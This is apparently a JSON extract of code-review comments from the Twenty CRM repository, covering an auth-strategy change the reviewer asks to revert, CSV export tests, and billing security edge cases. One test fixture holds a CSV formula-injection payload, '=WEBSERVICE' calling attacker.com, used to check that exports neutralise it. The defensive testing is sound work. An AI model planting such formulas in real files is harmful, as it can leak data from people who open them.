[
  {
    "discussion_id": "2337216842",
    "pr_number": 14360,
    "pr_file": "packages/twenty-server/src/engine/core-modules/auth/strategies/jwt.auth.strategy.ts",
    "created_at": "2025-09-10T15:56:17+00:00",
    "commented_code": "private async validateAccessToken(\n     payload: AccessTokenJwtPayload,\n   ): Promise<AuthContext> {\n-    let user: User | null = null;\n-    const workspace = await this.workspaceRepository.findOneBy({",
    "repo_full_name": "twentyhq/twenty",
    "discussion_comments": [
      {
        "comment_id": "2337216842",
        "repo_full_name": "twentyhq/twenty",
        "pr_number": 14360,
        "pr_file": "packages/twenty-server/src/engine/core-modules/auth/strategies/jwt.auth.strategy.ts",
        "discussion_id": "2337216842",
        "commented_code": "@@ -107,42 +108,46 @@ export class JwtAuthStrategy extends PassportStrategy(Strategy, 'jwt') {\n   private async validateAccessToken(\n     payload: AccessTokenJwtPayload,\n   ): Promise<AuthContext> {\n-    let user: User | null = null;\n-    const workspace = await this.workspaceRepository.findOneBy({",
        "comment_created_at": "2025-09-10T15:56:17+00:00",
        "comment_author": "FelixMalfait",
        "comment_body": "This seems like a change that could potentially be dangerous, can you explain the rationale behind this change?",
        "pr_file_module": null
      },
      {
        "comment_id": "2337220098",
        "repo_full_name": "twentyhq/twenty",
        "pr_number": 14360,
        "pr_file": "packages/twenty-server/src/engine/core-modules/auth/strategies/jwt.auth.strategy.ts",
        "discussion_id": "2337216842",
        "commented_code": "@@ -107,42 +108,46 @@ export class JwtAuthStrategy extends PassportStrategy(Strategy, 'jwt') {\n   private async validateAccessToken(\n     payload: AccessTokenJwtPayload,\n   ): Promise<AuthContext> {\n-    let user: User | null = null;\n-    const workspace = await this.workspaceRepository.findOneBy({",
        "comment_created_at": "2025-09-10T15:57:37+00:00",
        "comment_author": "FelixMalfait",
        "comment_body": "Not saying it's wrong! But we have to be extra careful here, it feels like a change that could be dangerous if not thoroughly reviewed",
        "pr_file_module": null
      },
      {
        "comment_id": "2343344423",
        "repo_full_name": "twentyhq/twenty",
        "pr_number": 14360,
        "pr_file": "packages/twenty-server/src/engine/core-modules/auth/strategies/jwt.auth.strategy.ts",
        "discussion_id": "2337216842",
        "commented_code": "@@ -107,42 +108,46 @@ export class JwtAuthStrategy extends PassportStrategy(Strategy, 'jwt') {\n   private async validateAccessToken(\n     payload: AccessTokenJwtPayload,\n   ): Promise<AuthContext> {\n-    let user: User | null = null;\n-    const workspace = await this.workspaceRepository.findOneBy({",
        "comment_created_at": "2025-09-12T07:59:11+00:00",
        "comment_author": "FelixMalfait",
        "comment_body": "@harshit078 :)",
        "pr_file_module": null
      },
      {
        "comment_id": "2346393262",
        "repo_full_name": "twentyhq/twenty",
        "pr_number": 14360,
        "pr_file": "packages/twenty-server/src/engine/core-modules/auth/strategies/jwt.auth.strategy.ts",
        "discussion_id": "2337216842",
        "commented_code": "@@ -107,42 +108,46 @@ export class JwtAuthStrategy extends PassportStrategy(Strategy, 'jwt') {\n   private async validateAccessToken(\n     payload: AccessTokenJwtPayload,\n   ): Promise<AuthContext> {\n-    let user: User | null = null;\n-    const workspace = await this.workspaceRepository.findOneBy({",
        "comment_created_at": "2025-09-13T11:12:35+00:00",
        "comment_author": "harshit078",
        "comment_body": "My rationale here was to secure Auth logic and improve it. The logic behind this code was - \r\n- Earlier we used to make 3 different query for user, workspace and userworkspace to fetch. The new code performs one single query to fetch the `UserWorkspace` and joins its related `user` and `workspace`.\r\n- I also added verification to check imperonsation logics and data fetch logic.",
        "pr_file_module": null
      },
      {
        "comment_id": "2348924415",
        "repo_full_name": "twentyhq/twenty",
        "pr_number": 14360,
        "pr_file": "packages/twenty-server/src/engine/core-modules/auth/strategies/jwt.auth.strategy.ts",
        "discussion_id": "2337216842",
        "commented_code": "@@ -107,42 +108,46 @@ export class JwtAuthStrategy extends PassportStrategy(Strategy, 'jwt') {\n   private async validateAccessToken(\n     payload: AccessTokenJwtPayload,\n   ): Promise<AuthContext> {\n-    let user: User | null = null;\n-    const workspace = await this.workspaceRepository.findOneBy({",
        "comment_created_at": "2025-09-15T13:00:55+00:00",
        "comment_author": "FelixMalfait",
        "comment_body": "Yes but to be honest the issue is that because you don't build trust in the rest of the PR it's hard to trust you on that. This change is risky. What you're checking now is not the same as what was checked before. I would prefer if you revert ",
        "pr_file_module": null
      },
      {
        "comment_id": "2348948032",
        "repo_full_name": "twentyhq/twenty",
        "pr_number": 14360,
        "pr_file": "packages/twenty-server/src/engine/core-modules/auth/strategies/jwt.auth.strategy.ts",
        "discussion_id": "2337216842",
        "commented_code": "@@ -107,42 +108,46 @@ export class JwtAuthStrategy extends PassportStrategy(Strategy, 'jwt') {\n   private async validateAccessToken(\n     payload: AccessTokenJwtPayload,\n   ): Promise<AuthContext> {\n-    let user: User | null = null;\n-    const workspace = await this.workspaceRepository.findOneBy({",
        "comment_created_at": "2025-09-15T13:09:45+00:00",
        "comment_author": "harshit078",
        "comment_body": "sure, I'll revert it !",
        "pr_file_module": null
      }
    ]
  },
  {
    "discussion_id": "2329937901",
    "pr_number": 14347,
    "pr_file": "packages/twenty-front/src/modules/object-record/record-index/export/hooks/__tests__/useRecordIndexExportRecords.test.ts",
    "created_at": "2025-09-08T11:20:11+00:00",
    "commented_code": ".toEqual(`Id,Foo,Empty,Nested link field / Link URL,Nested link field / Secondary Links,Relation\n 1,some field,,https://www.test.com,\"[{\"\"label\"\":\"\"secondary link 1\"\",\"\"url\"\":\"\"https://www.test.com\"\"},{\"\"label\"\":\"\"secondary link 2\"\",\"\"url\"\":\"\"https://www.test.com\"\"}]\",a relation`);\n   });\n+\n+  describe('CSV Injection Prevention with ZWJ', () => {\n+    it('prevents formula injection with equals sign using ZWJ prefix', () => {\n+      const columns = [\n+        { label: 'Name', metadata: { fieldName: 'name' } },\n+        { label: 'Formula', metadata: { fieldName: 'formula' } },\n+      ] as ColumnDefinition<FieldMetadata>[];\n+\n+      const rows = [\n+        {\n+          id: '1',\n+          name: 'Test User',\n+          formula: '=WEBSERVICE(\"http://attacker.com\")',\n+        },\n+      ];\n+\n+      const csv = generateCsv({ columns, rows });\n+\n+      // The malicious formula should be prefixed with ZWJ (preserving original content)\n+      expect(csv).toContain(\n+        `${CSV_INJECTION_PREVENTION_ZWJ}=WEBSERVICE(\"\"http://attacker.com\"\")`,\n+      );\n+      // Should not contain the raw dangerous formula\n+      expect(csv).not.toContain(\n+        '1,Test User,=WEBSERVICE(\"http://attacker.com\")',\n+      );\n+      // Should contain the ZWJ-prefixed version in CSV format\n+      expect(csv).toContain(\n+        `1,Test User,\"${CSV_INJECTION_PREVENTION_ZWJ}=WEBSERVICE(\"\"http://attacker.com\"\")\"`,\n+      );\n+    });\n+\n+    it('prevents formula injection with plus sign using ZWJ prefix', () => {\n+      const columns = [\n+        { label: 'Calculation', metadata: { fieldName: 'calculation' } },\n+      ] as ColumnDefinition<FieldMetadata>[];",
    "repo_full_name": "twentyhq/twenty",
    "discussion_comments": [
      {
        "comment_id": "2329937901",
        "repo_full_name": "twentyhq/twenty",
        "pr_number": 14347,
        "pr_file": "packages/twenty-front/src/modules/object-record/record-index/export/hooks/__tests__/useRecordIndexExportRecords.test.ts",
        "discussion_id": "2329937901",
        "commented_code": "@@ -49,6 +50,202 @@ describe('generateCsv', () => {\n       .toEqual(`Id,Foo,Empty,Nested link field / Link URL,Nested link field / Secondary Links,Relation\n 1,some field,,https://www.test.com,\"[{\"\"label\"\":\"\"secondary link 1\"\",\"\"url\"\":\"\"https://www.test.com\"\"},{\"\"label\"\":\"\"secondary link 2\"\",\"\"url\"\":\"\"https://www.test.com\"\"}]\",a relation`);\n   });\n+\n+  describe('CSV Injection Prevention with ZWJ', () => {\n+    it('prevents formula injection with equals sign using ZWJ prefix', () => {\n+      const columns = [\n+        { label: 'Name', metadata: { fieldName: 'name' } },\n+        { label: 'Formula', metadata: { fieldName: 'formula' } },\n+      ] as ColumnDefinition<FieldMetadata>[];\n+\n+      const rows = [\n+        {\n+          id: '1',\n+          name: 'Test User',\n+          formula: '=WEBSERVICE(\"http://attacker.com\")',\n+        },\n+      ];\n+\n+      const csv = generateCsv({ columns, rows });\n+\n+      // The malicious formula should be prefixed with ZWJ (preserving original content)\n+      expect(csv).toContain(\n+        `${CSV_INJECTION_PREVENTION_ZWJ}=WEBSERVICE(\"\"http://attacker.com\"\")`,\n+      );\n+      // Should not contain the raw dangerous formula\n+      expect(csv).not.toContain(\n+        '1,Test User,=WEBSERVICE(\"http://attacker.com\")',\n+      );\n+      // Should contain the ZWJ-prefixed version in CSV format\n+      expect(csv).toContain(\n+        `1,Test User,\"${CSV_INJECTION_PREVENTION_ZWJ}=WEBSERVICE(\"\"http://attacker.com\"\")\"`,\n+      );\n+    });\n+\n+    it('prevents formula injection with plus sign using ZWJ prefix', () => {\n+      const columns = [\n+        { label: 'Calculation', metadata: { fieldName: 'calculation' } },\n+      ] as ColumnDefinition<FieldMetadata>[];",
        "comment_created_at": "2025-09-08T11:20:11+00:00",
        "comment_author": "charlesBochet",
        "comment_body": "**note:** not related to this PR so I'm fine with it but we should rather make the generateCSV Pick<> instead of using \"as\" in the input",
        "pr_file_module": null
      }
    ]
  },
  {
    "discussion_id": "2303313828",
    "pr_number": 14092,
    "pr_file": "packages/twenty-server/src/engine/core-modules/billing/services/billing-subscription-item.service.ts",
    "created_at": "2025-08-27T08:55:10+00:00",
    "commented_code": "import { BillingProductKey } from 'src/engine/core-modules/billing/enums/billing-product-key.enum';\n import { BillingUsageType } from 'src/engine/core-modules/billing/enums/billing-usage-type.enum';\n import { TwentyConfigService } from 'src/engine/core-modules/twenty-config/twenty-config.service';\n+import { StripeSubscriptionService } from 'src/engine/core-modules/billing/stripe/services/stripe-subscription.service';\n \n @Injectable()\n export class BillingSubscriptionItemService {\n   constructor(\n     @InjectRepository(BillingSubscriptionItem, 'core')\n     private readonly billingSubscriptionItemRepository: Repository<BillingSubscriptionItem>,\n     private readonly twentyConfigService: TwentyConfigService,\n+    private readonly stripeSubscriptionService: StripeSubscriptionService,\n   ) {}\n \n-  async getMeteredSubscriptionItemDetails(subscriptionId: string) {\n-    const meteredSubscriptionItems =\n-      await this.billingSubscriptionItemRepository.find({\n+  async updateMeteredSubscriptionItemPrice(",
    "repo_full_name": "twentyhq/twenty",
    "discussion_comments": [
      {
        "comment_id": "2303313828",
        "repo_full_name": "twentyhq/twenty",
        "pr_number": 14092,
        "pr_file": "packages/twenty-server/src/engine/core-modules/billing/services/billing-subscription-item.service.ts",
        "discussion_id": "2303313828",
        "commented_code": "@@ -12,18 +12,23 @@ import { BillingSubscriptionItem } from 'src/engine/core-modules/billing/entitie\n import { BillingProductKey } from 'src/engine/core-modules/billing/enums/billing-product-key.enum';\n import { BillingUsageType } from 'src/engine/core-modules/billing/enums/billing-usage-type.enum';\n import { TwentyConfigService } from 'src/engine/core-modules/twenty-config/twenty-config.service';\n+import { StripeSubscriptionService } from 'src/engine/core-modules/billing/stripe/services/stripe-subscription.service';\n \n @Injectable()\n export class BillingSubscriptionItemService {\n   constructor(\n     @InjectRepository(BillingSubscriptionItem, 'core')\n     private readonly billingSubscriptionItemRepository: Repository<BillingSubscriptionItem>,\n     private readonly twentyConfigService: TwentyConfigService,\n+    private readonly stripeSubscriptionService: StripeSubscriptionService,\n   ) {}\n \n-  async getMeteredSubscriptionItemDetails(subscriptionId: string) {\n-    const meteredSubscriptionItems =\n-      await this.billingSubscriptionItemRepository.find({\n+  async updateMeteredSubscriptionItemPrice(",
        "comment_created_at": "2025-08-27T08:55:10+00:00",
        "comment_author": "FelixMalfait",
        "comment_body": "Let's make sure you think about security here, like for example I shouldn't be able to consume credits on a given months and then switch back to a lower amount and be reimbursed, etc. I can only switch to a higher amount, etc. Maybe it's covered but make sure you double check all edge-cases :))",
        "pr_file_module": null
      },
      {
        "comment_id": "2307349361",
        "repo_full_name": "twentyhq/twenty",
        "pr_number": 14092,
        "pr_file": "packages/twenty-server/src/engine/core-modules/billing/services/billing-subscription-item.service.ts",
        "discussion_id": "2303313828",
        "commented_code": "@@ -12,18 +12,23 @@ import { BillingSubscriptionItem } from 'src/engine/core-modules/billing/entitie\n import { BillingProductKey } from 'src/engine/core-modules/billing/enums/billing-product-key.enum';\n import { BillingUsageType } from 'src/engine/core-modules/billing/enums/billing-usage-type.enum';\n import { TwentyConfigService } from 'src/engine/core-modules/twenty-config/twenty-config.service';\n+import { StripeSubscriptionService } from 'src/engine/core-modules/billing/stripe/services/stripe-subscription.service';\n \n @Injectable()\n export class BillingSubscriptionItemService {\n   constructor(\n     @InjectRepository(BillingSubscriptionItem, 'core')\n     private readonly billingSubscriptionItemRepository: Repository<BillingSubscriptionItem>,\n     private readonly twentyConfigService: TwentyConfigService,\n+    private readonly stripeSubscriptionService: StripeSubscriptionService,\n   ) {}\n \n-  async getMeteredSubscriptionItemDetails(subscriptionId: string) {\n-    const meteredSubscriptionItems =\n-      await this.billingSubscriptionItemRepository.find({\n+  async updateMeteredSubscriptionItemPrice(",
        "comment_created_at": "2025-08-28T13:01:45+00:00",
        "comment_author": "charlesBochet",
        "comment_body": "had the same concern at resolver layer but I think this also makes sense at service layer.\r\n\r\nIt depends if the service is \"internal\" and is not meant to be direclty exposed to a resolver. Rule of thumb, the more close we are on the API, the safer we are.\r\nFor instance, user.service does not expose getAllUsers which would be dangerous but only deleteUser, etc... which precise checks",
        "pr_file_module": null
      }
    ]
  }
]